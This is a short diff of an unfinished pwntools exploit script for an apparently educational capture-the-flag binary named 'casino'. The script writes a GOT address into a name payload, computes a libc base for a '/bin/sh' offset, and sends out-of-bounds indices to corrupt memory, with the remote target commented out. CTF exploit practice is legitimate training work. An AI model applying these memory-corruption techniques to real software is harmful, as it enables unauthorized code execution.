@@ -26,11 +26,9 @@ main = 0x400564
 casino = 0x40095d
 name += p64(0x601ff0)
 
-# p for payload
-libc_base_addr = 0x1010101 - 0x21ab0
+# libc_base_addr = ???? - 0x21ab0
 print(hex(binsh_offset))
 
-# send
 r = process("./casino")
 # r = remote('edu-ctf.csie.org', 10176)
 r.sendlineafter('name: ', name)
@@ -66,13 +64,13 @@ while True:
         offset = (0x20 - 0xd0) / 4
         r.sendlineafter('0:no]:', '1')
 
+        pause()
         r.sendlineafter('6]:', str(offset + 2))
 
         r_out = 'Chose the number ' + str(offset + 1) +': '
         r.sendlineafter(r_out, '0')
         print('finished sending number and payload for step  %d: ' % (step))
         step += 1
-        pause()
     # do tomorrow!
     elif step == 3:
         exit()
